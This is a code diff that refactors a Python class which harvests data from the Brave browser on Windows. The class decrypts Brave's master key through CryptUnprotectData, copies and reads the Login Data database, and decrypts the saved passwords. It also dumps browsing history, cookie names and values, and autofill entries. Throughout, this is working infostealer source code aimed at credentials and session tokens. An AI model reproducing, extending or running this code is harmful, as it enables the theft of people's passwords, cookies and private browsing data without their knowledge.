@@ -13,9 +13,11 @@ class Brave:
     def __init__(self):
         self._user_data = os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data"
         
-        self._master_key = self.get_installed_browsers()
-        
+        self._master_key = self._get_master_key()
     def get_installed_browsers(self):
+        """
+        Returns True if Brave is installed on the system, False otherwise
+        """
         default_dir_paths = ["C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                              "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"]
         for path in default_dir_paths:
@@ -35,19 +37,13 @@ class Brave:
             return False
 
     def _get_master_key(self):
-        try:
-            if self._master_key:
-                with open(self._user_data + "\\Local State", "r") as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                    master_key = master_key[5:]
-                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-                    return master_key
-            else:
-                return "Bavre browsers is not installed!!!!"
-        except Exception as e:
-            return e
+        with open(self._user_data + "\\Local State", "r") as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = master_key[5:]
+            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+            return master_key
 
     @staticmethod
     def _decrypt(buff, master_key):
@@ -63,108 +59,89 @@ class Brave:
 
     @staticmethod
     def _convert_time(time):
-        try:
-            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
-            code_stamp = epoch + timedelta(microseconds=time)
-            return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')
-        except Exception as e:
-            return e
+        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
+        code_stamp = epoch + timedelta(microseconds=time)
+        return code_stamp.strftime('%Y/%m/%d - %H:%M:%S')
 
     def brave_passwords(self):
         try:
-            if self._master_key:
-                login_db = self._user_data + "\\Default\\Login Data"
-                login_db_copy = os.getenv("TEMP") + "\\Login.db"
-                shutil.copy2(login_db, login_db_copy)
-                conn = sqlite3.connect(login_db_copy)
-                cursor = conn.cursor()
+            login_db = self._user_data + "\\Default\\Login Data"
+            login_db_copy = os.getenv("TEMP") + "\\Login.db"
+            shutil.copy2(login_db, login_db_copy)
+            conn = sqlite3.connect(login_db_copy)
+            cursor = conn.cursor()
 
-                password_data = ""
-                try:
-                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                    for item in cursor.fetchall():
-                        url = item[0]
-                        username = item[1]
-                        encrypted_password = item[2]
-                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
-                        result = f"URLs: {url}\n"
-                        result += f"Username: {username}\n"
-                        result += f"Password: {decrypted_password}\n\n"
-                        password_data += result
-                        # password_data.append({'url': url, 'username': username, 'password': decrypted_password})
+            password_data = ""
+            try:
+                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                for item in cursor.fetchall():
+                    url = item[0]
+                    username = item[1]
+                    encrypted_password = item[2]
+                    decrypted_password = self._decrypt(encrypted_password, self._master_key)
+                    result = f"URLs: {url}\n"
+                    result += f"Username: {username}\n"
+                    result += f"Password: {decrypted_password}\n\n"
+                    password_data += result
+                    # password_data.append({'url': url, 'username': username, 'password': decrypted_password})
 
-                except sqlite3.Error:
-                    pass
+            except sqlite3.Error:
+                pass
 
-                cursor.close()
-                conn.close()
-                os.remove(login_db_copy)
-                return password_data
-            else:
-                return "Brave browser is not installed!!!!"
+            cursor.close()
+            conn.close()
+            os.remove(login_db_copy)
+            return password_data
         except Exception as e:
-            return e
+            print("Error: ", e)
             
     def get_brave_history(self):
+        message =""
+        """
+        Returns a list of tuples containing the URL and title of each website visited in Brave
+        """
+        # Set the console encoding to utf-8
+        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+
+        history_file_path = self._user_data + "\\Default\\History"
         try:
-            if self._master_key:
-                message =""
-                sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
-                history_file_path = self._user_data + "\\Default\\History"
-                try:
-                    conn = sqlite3.connect(history_file_path)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT url, title FROM urls")
-                    results = cursor.fetchall()
-                    for row in results:
-                        messages = f"Urls: {row[0]}\n"
-                        messages+= f"Title: {row[1]}\n\n"
-                        message += messages
-                    return message
-                except:
-                    return None
-            else:
-                return "Brave browser is not installed!!!!"
-        except Exception as e:
-            return e
+            conn = sqlite3.connect(history_file_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title FROM urls")
+            results = cursor.fetchall()
+            for row in results:
+                messages = f"Urls: {row[0]}\n"
+                messages+= f"Title: {row[1]}\n\n"
+                message += messages
+            return message
+        except:
+            return None
         
     def brave_cookies(self):
-        try:
-            if self._master_key:
-                cookies_data = ""
-                cookies = list(browser_cookie3.brave())
-                for cookie in cookies:
-                    data_cookies = f"Cookies Name: {cookie.name} \n"
-                    data_cookies += f"Cookies domain : {cookie.domain} \n"
-                    data_cookies += f"Cookies Values : {cookie.value} \n"
-                    data_cookies += f"Cookies expires : {cookie.expires} \n\n"
-                    cookies_data += data_cookies
-                return cookies_data 
-            else:
-                return "Brave Browser is not installed!!!!!!" 
-        except Exception as e:
-            return e
+        cookies_data = ""
+        cookies = list(browser_cookie3.brave())
+        for cookie in cookies:
+            data_cookies = f"Cookies Name: {cookie.name} \n"
+            data_cookies += f"Cookies domain : {cookie.domain} \n"
+            data_cookies += f"Cookies Values : {cookie.value} \n"
+            data_cookies += f"Cookies expires : {cookie.expires} \n\n"
+            cookies_data += data_cookies
+        return cookies_data  
 
     def get_edge_autofill_data(self):
+        db_path =self._user_data + "\\Default\\Web Data"
         try:
-            if self._master_key:
-                db_path =self._user_data + "\\Default\\Web Data"
-                try:
-                    conn = sqlite3.connect(db_path)
-                    c = conn.cursor()
-                    c.execute("SELECT * FROM autofill")
-                    autofill_data = c.fetchall()
-                    return autofill_data
-                except sqlite3.Error as e:
-                    print("Error retrieving autofill data:", e)
-                    return None
-                finally:
-                    if conn:
-                        conn.close()
-            else:
-                return "Brave browsers is not installed !!!!!"
-        except Exception as e:
-            return e
+            conn = sqlite3.connect(db_path)
+            c = conn.cursor()
+            c.execute("SELECT * FROM autofill")
+            autofill_data = c.fetchall()
+            return autofill_data
+        except sqlite3.Error as e:
+            print("Error retrieving autofill data:", e)
+            return None
+        finally:
+            if conn:
+                conn.close()
 
 if __name__ == "__main__":
     brave = Brave()
